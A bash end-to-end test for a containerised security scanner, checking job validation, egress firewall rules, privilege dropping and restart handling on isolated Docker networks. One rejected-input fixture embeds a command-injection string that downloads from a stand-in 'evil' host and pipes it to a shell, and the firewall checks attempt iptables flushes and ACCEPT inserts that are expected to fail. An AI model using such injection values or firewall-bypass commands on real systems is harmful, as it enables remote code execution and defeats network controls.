#!/usr/bin/env bash
# run_demo.sh - end-to-end test of the scanner container, job runner, firewall and demo target. One command:
#   tests/e2e/run_demo.sh
# Uses only internal Docker networks (no route off the machine) and cleans up everything it created, including
# volumes and networks, on success and on failure. Needs Docker with Compose; builds both images first.
set -u
cd "$(dirname "${BASH_SOURCE[0]}")/../.." || exit 2
ROOT=$PWD
PROJECT=momus-lab
LAB_CIDR=10.89.47.0/24
DECOY_NET=momus-e2e-decoy
DECOY_CIDR=10.89.48.0/24
DECOY_IP=10.89.48.10
NOLAB_NET=momus-e2e-nolab
NOLAB_VOLS="momus-e2e-nolab-data momus-e2e-nolab-jobs momus-e2e-nolab-pub"
SCN=$PROJECT-scanner-1
WORK=$(mktemp -d "${TMPDIR:-/tmp}/momus-e2e.XXXXXX")
dc(){ docker compose -p "$PROJECT" -f "$ROOT/compose.yaml" -f "$ROOT/compose.lab.yaml" "$@"; }
jc(){ dc run --rm -T jobctl "$@" 2>/dev/null; }
jcv(){ dc run --rm -T -v "$WORK/jobs:/e2e:ro" jobctl "$@" 2>/dev/null; }
PASS=0; FAIL=0
check(){ # check NAME CONDITION-EXIT-CODE [DETAIL]
  if [ "$2" -eq 0 ]; then PASS=$((PASS+1)); echo "PASS $1"; else FAIL=$((FAIL+1)); echo "FAIL $1${3:+  [$3]}"; fi
}
py_check(){ # runs check_demo.py in a no-network container over the published volume; folds its PASS/FAIL lines in
  local out rc
  out=$(docker run --rm --network none --user 10001:10001 --entrypoint python3 \
    -v "${PROJECT}_published:/p:ro" -v "$ROOT/demo/canaries.json:/c/canaries.json:ro" -v "$ROOT/tests/e2e:/e2e:ro" \
    -v "$WORK/logs:/logs:ro" -v "${PROJECT}_scan_data:/raw:ro" momus-scanner -I -B /e2e/check_demo.py "$@" --published /p --canaries /c/canaries.json 2>&1); rc=$?
  printf '%s\n' "$out"
  PASS=$((PASS + $(printf '%s\n' "$out" | grep -c '^PASS'))); FAIL=$((FAIL + $(printf '%s\n' "$out" | grep -c '^FAIL')))
  if [ "$rc" -ne 0 ] && ! printf '%s\n' "$out" | grep -q '^FAIL'; then FAIL=$((FAIL+1)); echo "FAIL check_demo.py $1 exited $rc"; fi
}
status_field(){ # status_field JOB FIELD -> value from published/status/JOB.json (empty if none)
  docker run --rm --network none --user 10001:10001 --entrypoint python3 -v "${PROJECT}_published:/p:ro" momus-scanner -I -B -c '
import json,sys
try: print(json.load(open(f"/p/status/{sys.argv[1]}.json")).get(sys.argv[2]) or "")
except Exception: print("")' "$1" "$2"
}
cleanup(){
  docker rm -f momus-e2e-decoy momus-e2e-nocap momus-e2e-nolab momus-e2e-resolver >/dev/null 2>&1
  dc --profile dev down -v --remove-orphans >/dev/null 2>&1
  docker network rm "$DECOY_NET" "$NOLAB_NET" >/dev/null 2>&1
  docker volume rm $NOLAB_VOLS >/dev/null 2>&1
  rm -rf "$WORK"
}
trap cleanup EXIT

echo "== 0. clean state"
cleanup; WORK=$(mktemp -d "${TMPDIR:-/tmp}/momus-e2e.XXXXXX"); mkdir -p "$WORK/jobs" "$WORK/logs"

echo "== 1. build both images and start the stack in lab mode"
t0=$(date +%s)
# services named explicitly: compose.yaml also defines the brain, which this test neither builds nor starts
dc build scanner demo-target >"$WORK/build.log" 2>&1; rc=$?
check "1 both images build (scanner and demo target) in $(( $(date +%s) - t0 ))s" $rc "$(tail -5 "$WORK/build.log")"
[ $rc -eq 0 ] || { echo "SUMMARY: $PASS passed, $FAIL failed"; exit 1; }
dc up -d scanner demo-target >"$WORK/up.log" 2>&1; check "1 the lab stack starts" $? "$(tail -5 "$WORK/up.log")"
for c in "$SCN" "$PROJECT-demo-target-1"; do
  nets=$(docker inspect -f '{{range $k, $v := .NetworkSettings.Networks}}{{$k}} {{end}}' "$c")
  bad=""; for n in $nets; do [ "$(docker network inspect -f '{{.Internal}}' "$n")" = true ] || bad="$bad $n"; done
  check "1 every network attached to $c is internal ($nets)" "$([ -n "$nets" ] && [ -z "$bad" ]; echo $?)" "not internal:$bad"
done
for i in $(seq 1 30); do docker logs "$SCN" 2>&1 | grep -q 'runner: started' && break; sleep 1; done
docker logs "$SCN" >"$WORK/scanner-start.log" 2>&1
check "1 the scanner installed and verified its firewall, then started the runner as uid 10001" \
  "$(grep -q 'egress firewall installed and verified' "$WORK/scanner-start.log" && grep -q 'runner: started as uid 10001' "$WORK/scanner-start.log"; echo $?)" "$(tail -3 "$WORK/scanner-start.log")"
ext=$(docker exec -u 10001 "$SCN" sed -n 's/^# ExtServers: //p' /etc/resolv.conf)
check "1 lab DNS: Docker's resolver forwards outside names to the unused lab address, from inside the container ($ext)" \
  "$([ "$ext" = "[10.89.47.53]" ]; echo $?)"
check "1 lab DNS: the entrypoint warns that this resolver is not globally routable (port 53 only)" \
  "$(grep -q 'WARNING: resolver 10.89.47.53 .* not globally routable .* reachable on port 53 only' "$WORK/scanner-start.log"; echo $?)" "$(grep -i resolver "$WORK/scanner-start.log")"
check "1 the runner created its install secret (owner-only, in the scanner's own state folder)" \
  "$(docker exec -u 10001 "$SCN" stat -c '%a %U %s' /var/lib/scan/state /var/lib/scan/state/install_secret | tr '\n' ' ' | grep -q '^700 scanner [0-9]* 600 scanner 65 $'; echo $?)" \
  "$(docker exec -u 10001 "$SCN" stat -c '%n %a %U %s' /var/lib/scan/state /var/lib/scan/state/install_secret 2>&1 | tr '\n' ' ')"

echo "== 2. scope-sync, inventory, approval bound to that inventory, full job (jobctl)"
# the domain is a reserved .test name; its DNS questions go to the unused lab resolver address and get no answer
jc attest owned.demo.test --by "Demo Operator" >/dev/null; check "2 ownership statement recorded through jobctl (no token)" $?
jc submit scope-sync --id e2e-sync >/dev/null
jc wait e2e-sync --timeout 300 --quiet >"$WORK/sync.json"; check "2 scope-sync job ends done" $? "$(grep -E '"state"|reason' "$WORK/sync.json")"
py_check scope --domain owned.demo.test
LABARGS=(--lab-target target.demo.test --lab-target notice.demo.test --lab-cidr "$LAB_CIDR" --rate-profile fast)
jc submit inventory --id e2e-inv "${LABARGS[@]}" >/dev/null
jc wait e2e-inv --timeout 900 --quiet >"$WORK/inv.json"; check "2 inventory job ends done" $? "$(grep -E '"state"|reason' "$WORK/inv.json")"
jc approve e2e-inv --by "Demo Operator" >/dev/null; check "2 inventory approved through jobctl" $?
jc submit full --id e2e-full "${LABARGS[@]}" --approved-host target.demo.test >/dev/null
t0=$(date +%s)
jc wait e2e-full --timeout 2400 --quiet >"$WORK/full.json"; rc=$?
check "2 full job ends done ($(( $(date +%s) - t0 ))s)" $rc "$(grep -E '"state"|reason|recon|ingest' "$WORK/full.json")"

echo "== 3 and 5. snapshot, latest.json, findings with verdicts, escaped title"
py_check results --job e2e-full --expect generic-env,git-config,configuration-listing

echo "== 3b. version watch (lab): the example PHP watch (docs/version-watch.md) on the lab targets"
mkdir -p "$WORK/vw"
cat > "$WORK/vw/watches.json" <<'JSON'
[{"id": "php-example", "name": "PHP example", "product": "php", "cves": ["CVE-2099-0001", "CVE-2099-0002"],
  "floors": {"8.2": 35, "8.3": 36, "8.4": 27, "8.5": 12}, "hosts": ["notice.demo.test", "target.demo.test"]}]
JSON
dc run --rm -T -v "$WORK/vw:/vw:ro" jobctl submit version-watch --id e2e-vw --lab-target target.demo.test --lab-target notice.demo.test \
  --lab-cidr "$LAB_CIDR" --watches-file /vw/watches.json >/dev/null 2>&1
jc wait e2e-vw --timeout 600 --quiet >"$WORK/vw.json"; check "3b version-watch job ends done" $? "$(grep -E '"state"|reason|version_watch|dns_proof' "$WORK/vw.json")"
py_check watch --job e2e-vw --watch php-example

echo "== 2b. an approval naming a different inventory is refused"
jc submit inventory --id e2e-inv-notice --lab-target notice.demo.test --lab-cidr "$LAB_CIDR" --rate-profile fast >/dev/null
jc wait e2e-inv-notice --timeout 900 --quiet >/dev/null; check "2b a second inventory, of notice.demo.test only, ends done" $?
jc approve e2e-inv-notice --by "Demo Operator" >/dev/null
jc submit full --id bad-approval "${LABARGS[@]}" --approved-host target.demo.test >/dev/null
jc wait bad-approval --timeout 300 --quiet >/dev/null
s=$(status_field bad-approval state); r=$(status_field bad-approval reason)
check "2b a full job whose approval names an inventory of other targets is rejected ($r)" \
  "$([ "$s" = rejected ] && [[ "$r" == *"does not cover every"* ]]; echo $?)" "state=$s reason=$r"
jc approve e2e-inv --by "Demo Operator" >/dev/null; check "2b the approval is bound to e2e-inv again for the jobs below" $?

echo "== 8. job validation"
python3 -I -B - "$WORK/jobs" <<'PY'
import json, os, sys, copy
d = sys.argv[1]
st = "I own this domain and the systems it points to."
import datetime
now = datetime.datetime.now(datetime.timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")   # created_at is required
base = {"schema": "momus-job-v1", "type": "full", "created_at": now, "scope": {"domains": ["example.test"], "ownership": [
    {"apex": "example.test", "statement": st, "attested_by": "Demo Operator", "attested_at": "2030-01-01T00:00:00Z"}]}}
def put(name, jid, change):
    j = copy.deepcopy(base); j["id"] = jid; change(j)
    with open(os.path.join(d, name), "w") as fh:
        json.dump(j, fh)
put("bad-unknown.json", "bad-unknown", lambda j: j.update(run_shell="id"))
put("Bad_ID.json", "Bad_ID", lambda j: None)
put("bad-shell.json", "bad-shell", lambda j: (j["scope"].update(domains=["example.test", "x.test;curl${IFS}evil|sh"])))
put("bad-big.json", "bad-big", lambda j: j["scope"].update(approved_hosts=[f"h{i}.example.test" for i in range(6000)]))
put("bad-verified.json", "bad-verified", lambda j: j["scope"]["ownership"][0].update(state="verified", verified_at="2030-01-01T00:00:00Z"))
put("bad-labcidr.json", "bad-labcidr", lambda j: j.update(lab={"targets": ["target.demo.test"], "cidr": "10.89.48.0/24"}))
put("bad-token.json", "bad-token", lambda j: j["scope"]["ownership"][0].update(token="0123456789abcdef0123456789abcdef"))
# a watch can never supply a pattern: a branch written as a regular expression is refused
put("bad-watch.json", "bad-watch", lambda j: j.update(type="version-watch", options={"watches": [
    {"id": "w-1", "name": "PHP", "product": "php", "cves": ["CVE-2099-10001"], "floors": {".*": 1}}]}))
# a deeply nested file is refused before parsing and must not stop the runner; the next job must still run
with open(os.path.join(d, "bad-nested.json"), "w") as fh:
    fh.write("[" * 100000 + "]" * 100000)
PY
want(){ case "$1" in
  bad-unknown) echo "unknown field 'run_shell'";; bad-shell) echo "scope.domains[1]: not a valid host name";;
  bad-big) echo "scope.approved_hosts: more than";; bad-verified) echo "verification state is kept by the scanner";;
  bad-labcidr) echo "lab.cidr: must equal the lab range";; bad-token) echo "field 'token' not allowed";;
  bad-nested) echo "nested too deeply";; bad-watch) echo "options.watches[0].floors: a branch is not of the form x.y";; esac; }
for f in bad-unknown bad-shell bad-big bad-verified bad-labcidr bad-token bad-watch bad-nested Bad_ID; do jcv submit --raw "/e2e/$f.json" >/dev/null; done
jc submit scope-sync --id e2e-after-nested >/dev/null
BADKEY="invalid-$(python3 -I -B -c 'import hashlib; print(hashlib.sha256(b"Bad_ID.json").hexdigest()[:16])')"
for i in $(seq 1 60); do [ -n "$(status_field "$BADKEY" state)" ] && [ -n "$(status_field bad-labcidr state)" ] && break; sleep 2; done
for k in bad-unknown bad-shell bad-big bad-verified bad-labcidr bad-token bad-watch bad-nested; do
  s=$(status_field "$k" state); r=$(status_field "$k" reason)
  check "8 $k is rejected ($r)" "$([ "$s" = rejected ] && [[ "$r" == *"$(want "$k")"* ]]; echo $?)" "state=$s reason=$r"
done
jc wait e2e-after-nested --timeout 300 --quiet >/dev/null
check "8 the next job after the deeply nested file still runs (scope-sync e2e-after-nested ends done)" $? "$(status_field e2e-after-nested state)"
check "8 the runner was not restarted by the nested file (container restart count 0)" \
  "$([ "$(docker inspect -f '{{.RestartCount}}' "$SCN")" = 0 ]; echo $?)"
s=$(status_field "$BADKEY" state); r=$(status_field "$BADKEY" reason)
check "8 bad ID (file Bad_ID.json) is rejected under a sanitized key ($r)" "$([ "$s" = rejected ] && [[ "$r" == *"file name"* ]]; echo $?)" "state=$s"
check "8 no rejection reason echoes the offending value" \
  "$(for k in bad-unknown bad-shell bad-big bad-verified bad-labcidr bad-token bad-watch; do status_field "$k" reason; done | grep -qE 'curl|evil|IFS|h5999|10\.89\.48|0123456789abcdef|\.\*'; [ $? -ne 0 ]; echo $?)"
runs=$(docker exec -u 10001 "$SCN" ls /var/lib/scan/runs)
check "8 nothing ran for any rejected job (no run directory)" "$(printf '%s\n' "$runs" | grep -qE '^(bad-|Bad_ID)'; [ $? -ne 0 ]; echo $?)" "$runs"

echo "== 6. firewall"
docker network create --internal --subnet "$DECOY_CIDR" "$DECOY_NET" >/dev/null
docker run -d --name momus-e2e-decoy --network "$DECOY_NET" --ip "$DECOY_IP" --read-only --cap-drop ALL momus-demo-target >/dev/null
CONNECT='import socket,sys,errno
s=socket.socket(); s.settimeout(4)
try: s.connect((sys.argv[1],int(sys.argv[2]))); print("CONNECTED")
except socket.timeout: print("TIMEOUT")
except OSError as e: print(errno.errorcode.get(e.errno,e.errno))'
sleep 2
ctl=$(docker run --rm --network "$DECOY_NET" --user 10001 --entrypoint python3 momus-scanner -I -B -c "$CONNECT" "$DECOY_IP" 80)
check "6 control: another container on the decoy network reaches the decoy ($ctl)" "$([ "$ctl" = CONNECTED ]; echo $?)"
docker network connect "$DECOY_NET" "$SCN"; check "6 the scanner is attached to the decoy network too" $?
cnt(){ docker exec -u 0 "$SCN" iptables -w 5 -L MOMUS_EGRESS -v -x -n | awk '$3=="REJECT" && $9=="10.0.0.0/8"{print $1}'; }
before=$(cnt)
got=$(docker exec -u 10001 "$SCN" python3 -I -B -c "$CONNECT" "$DECOY_IP" 80)
after=$(cnt)
check "6 the scanner cannot connect to the decoy by address ($got; reject rule for 10.0.0.0/8 matched $((after-before)) packet(s))" \
  "$([ "$got" != CONNECTED ] && [ "$after" -gt "$before" ]; echo $?)"
lab=$(docker exec -u 10001 "$SCN" python3 -I -B -c 'import urllib.request
print(urllib.request.urlopen("http://target.demo.test/", timeout=5).status)' 2>&1 | tail -1)
check "6 the scanner reaches the demo target (HTTP $lab), by name through the container resolver" "$([ "$lab" = 200 ]; echo $?)"
docker network disconnect "$DECOY_NET" "$SCN" >/dev/null 2>&1
p1=$(docker exec -u 10001 "$SCN" grep -E '^(Uid|Gid|CapInh|CapPrm|CapEff|CapBnd|CapAmb|NoNewPrivs):' /proc/1/status | tr -s '\t ' ' ')
cmd1=$(docker exec -u 10001 "$SCN" sh -c 'tr "\0" " " < /proc/1/cmdline')
check "6 the runner (PID 1) runs as uid 10001 with every capability set empty and no-new-privileges" \
  "$(printf '%s\n' "$p1" | grep -q '^Uid: 10001 10001 10001 10001' && [ "$(printf '%s\n' "$p1" | grep -c ': 0000000000000000$')" -eq 5 ] && printf '%s\n' "$p1" | grep -q '^NoNewPrivs: 1' && [[ "$cmd1" == *runner.py* ]]; echo $?)" "$p1 / $cmd1"
rules_before=$(docker exec -u 0 "$SCN" sh -c 'iptables -w 5 -S; ip6tables -w 5 -S')
docker exec -u 10001 "$SCN" iptables -S >/dev/null 2>"$WORK/ipt-list.err"; l=$?
docker exec -u 10001 "$SCN" iptables -I OUTPUT 1 -j ACCEPT >/dev/null 2>"$WORK/ipt-add.err"; c1=$?
docker exec -u 10001 "$SCN" ip6tables -F >/dev/null 2>&1; c2=$?
docker exec -u 10001 "$SCN" iptables -F MOMUS_EGRESS >/dev/null 2>&1; c3=$?
rules_after=$(docker exec -u 0 "$SCN" sh -c 'iptables -w 5 -S; ip6tables -w 5 -S')
check "6 after the drop, a scanner process cannot list the rules (iptables -S exit $l: $(head -c 80 "$WORK/ipt-list.err"))" "$([ $l -ne 0 ]; echo $?)"
check "6 after the drop, a scanner process cannot change the rules (insert $c1, flush v6 $c2, flush chain $c3; rules unchanged)" \
  "$([ $c1 -ne 0 ] && [ $c2 -ne 0 ] && [ $c3 -ne 0 ] && [ "$rules_before" = "$rules_after" ]; echo $?)"

echo "== 9. restart during a run"
jc submit full --id e2e-restart "${LABARGS[@]}" --approved-host target.demo.test >/dev/null
ph=""; for i in $(seq 1 120); do ph=$(status_field e2e-restart phase); [[ "$ph" == recon:* ]] && break; sleep 1; done
check "9 the job is running (phase $ph) before the kill" "$([[ "$ph" == recon:* ]]; echo $?)"
docker logs "$SCN" >"$WORK/logs/scanner-before-kill.log" 2>&1
docker kill "$SCN" >/dev/null; check "9 the scanner is killed (SIGKILL) during the run" $?
dc start scanner >/dev/null 2>&1
for i in $(seq 1 60); do [ "$(status_field e2e-restart state)" = interrupted ] && break; sleep 1; done
check "9 after the restart the killed job is marked interrupted" "$([ "$(status_field e2e-restart state)" = interrupted ]; echo $?)" "$(status_field e2e-restart state)"
jc submit inventory --id e2e-after "${LABARGS[@]}" >/dev/null
jc wait e2e-after --timeout 900 --quiet >"$WORK/after.json"; check "9 a new job runs normally after the restart" $? "$(grep -E '"state"|reason' "$WORK/after.json")"
check "9 the interrupted job stays interrupted (not re-run)" "$([ "$(status_field e2e-restart state)" = interrupted ]; echo $?)"

echo "== 4. canaries (snapshots, reports, CSVs, status files, container logs)"
docker logs "$SCN" >"$WORK/logs/scanner-after-restart.log" 2>&1
py_check canaries --logs /logs --control /raw/runs/e2e-full

echo "== 7. fail closed without NET_ADMIN; lab fields refused without lab mode"
docker network create --internal "$NOLAB_NET" >/dev/null
for v in $NOLAB_VOLS; do docker volume create "$v" >/dev/null; done
docker run --rm --network none --user 10001:10001 --entrypoint python3 -v momus-e2e-nolab-jobs:/srv/jobs -v momus-e2e-nolab-data:/var/lib/scan \
  momus-scanner -I -B /app/scanner/jobctl.py --jobs /srv/jobs --published /nonexistent --state /var/lib/scan/jobctl \
  submit inventory --id e2e-nocap --lab-target target.demo.test --lab-cidr "$LAB_CIDR" >/dev/null
SC_OPTS=(--read-only --tmpfs /tmp --security-opt no-new-privileges:true --cap-drop ALL --cap-add SETUID --cap-add SETGID --cap-add SETPCAP
         -v momus-e2e-nolab-data:/var/lib/scan -v momus-e2e-nolab-jobs:/srv/jobs:ro -v momus-e2e-nolab-pub:/srv/published)
docker run --name momus-e2e-nocap --network "$NOLAB_NET" "${SC_OPTS[@]}" -e SCAN_LAB=1 -e SCAN_LAB_CIDR="$LAB_CIDR" momus-scanner >"$WORK/nocap.log" 2>&1; rc=$?
docker rm momus-e2e-nocap >/dev/null 2>&1
pubfiles=$(docker run --rm --network none --entrypoint find -v momus-e2e-nolab-pub:/p:ro momus-scanner /p -type f)
check "7 without NET_ADMIN the scanner exits non-zero (rc $rc: $(grep FATAL "$WORK/nocap.log" | head -1))" "$([ $rc -ne 0 ] && grep -q FATAL "$WORK/nocap.log"; echo $?)"
check "7 without NET_ADMIN no job ran (no status, no run directory)" \
  "$([ -z "$pubfiles" ] && [ -z "$(docker run --rm --network none --entrypoint ls -v momus-e2e-nolab-data:/d:ro momus-scanner /d/runs 2>/dev/null)" ]; echo $?)" "$pubfiles"
docker run -d --name momus-e2e-nolab --network "$NOLAB_NET" "${SC_OPTS[@]}" --cap-add NET_ADMIN momus-scanner >/dev/null
r=""; for i in $(seq 1 60); do
  r=$(docker run --rm --network none --entrypoint sh -v momus-e2e-nolab-pub:/p:ro momus-scanner -c 'cat /p/status/e2e-nocap.json 2>/dev/null'); [ -n "$r" ] && break; sleep 1; done
check "8 lab fields without lab mode: the job is rejected" "$(printf '%s' "$r" | grep -q '"state": "rejected"' && printf '%s' "$r" | grep -q 'not started in lab mode'; echo $?)" "$r"
check "8 lab fields without lab mode: nothing ran" "$(docker exec -u 10001 momus-e2e-nolab sh -c 'ls /var/lib/scan/runs 2>/dev/null' | grep -q .; [ $? -ne 0 ]; echo $?)"
docker logs momus-e2e-nolab >"$WORK/nolab.log" 2>&1
check "7 control: the same container with NET_ADMIN starts (firewall verified, no lab range)" \
  "$(grep -Eq 'egress firewall installed and verified \(IPv4 [0-9]+ rules, IPv6 [0-9]+ rules\)' "$WORK/nolab.log"; echo $?)" "$(grep -E 'egress firewall|FATAL' "$WORK/nolab.log" | tail -2)"

echo "== 7b. firewall details: a non-global resolver from the DNS configuration is warned about"
printf 'nameserver 127.0.0.11\n# ExtServers: [10.20.30.40]\n' > "$WORK/resolv.conf"
docker run -d --name momus-e2e-resolver --network none --cap-drop ALL --cap-add NET_ADMIN --cap-add SETUID --cap-add SETGID --cap-add SETPCAP \
  --security-opt no-new-privileges:true -v "$WORK/resolv.conf:/etc/resolv.conf:ro" momus-scanner >/dev/null
for i in $(seq 1 30); do docker logs momus-e2e-resolver 2>&1 | grep -q 'runner: started' && break; sleep 1; done
docker logs momus-e2e-resolver >"$WORK/resolver.log" 2>&1
rules6=$(docker exec -u 0 momus-e2e-resolver ip6tables -w 5 -S MOMUS_EGRESS | grep -c 'icmpv6-type')
nd_any=$(docker exec -u 0 momus-e2e-resolver ip6tables -w 5 -S MOMUS_EGRESS | grep 'icmpv6-type' | grep -vcE ' -d (fe80::/10|ff02::/16) ')
docker rm -f momus-e2e-resolver >/dev/null 2>&1
check "7b the entrypoint warns that resolver 10.20.30.40 is reachable on port 53 only, and still starts" \
  "$(grep -q 'WARNING: resolver 10.20.30.40 .*private address.*reachable on port 53 only' "$WORK/resolver.log" && grep -q 'egress firewall installed and verified' "$WORK/resolver.log"; echo $?)" "$(grep -iE 'resolver|FATAL' "$WORK/resolver.log")"
check "7b IPv6 neighbour discovery is allowed only to fe80::/10 and ff02::/16 ($rules6 rules, $nd_any without that destination)" \
  "$([ "$rules6" = 6 ] && [ "$nd_any" = 0 ]; echo $?)"

echo "== 10. tear down"
cleanup; trap - EXIT
left=$(docker ps -a --format '{{.Names}}' | grep -E "^($PROJECT-|momus-e2e-)"; docker volume ls -q | grep -E "^(${PROJECT}_|momus-e2e-)"; docker network ls --format '{{.Name}}' | grep -E "^(${PROJECT}_|momus-e2e-)")
check "10 no container, volume or network from this test is left" "$([ -z "$left" ]; echo $?)" "$left"

echo "SUMMARY: $PASS passed, $FAIL failed"
[ "$FAIL" -eq 0 ]
